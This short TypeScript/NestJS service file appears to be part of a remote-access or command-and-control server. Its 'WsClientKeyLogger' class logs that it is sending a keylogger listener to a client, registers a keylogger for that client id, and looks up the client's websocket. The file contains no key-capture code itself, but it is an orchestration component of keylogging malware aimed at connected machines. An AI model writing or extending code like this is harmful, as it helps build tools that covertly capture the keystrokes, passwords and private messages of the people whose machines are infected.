import { KeyLoggerRepository } from "@/src/modules/client/domain/keylogger.repository";
import { Injectable } from "@nestjs/common";
import { WsClientRepository } from "../../domain/ws-client.repository";
import { LoggerService } from "@/src/modules/shared/providers";

@Injectable()
export class WsClientKeyLogger {
  constructor(
    private readonly keyLoggerRepository: KeyLoggerRepository,
    private readonly wsClientRepository: WsClientRepository,
    private readonly logger: LoggerService,
  ) {}

  async execute(clientid: string) {
    this.logger.info(`Sending keylogger listener to client: ${clientid}`);

    this.keyLoggerRepository.createKeyLogger(clientid);

    const client = this.wsClientRepository.getClient(clientid);

    if (!client) {
      this.logger.error(`Client socket not found: ${clientid}`);
      throw new Error("Client not found");
    }
  }
}
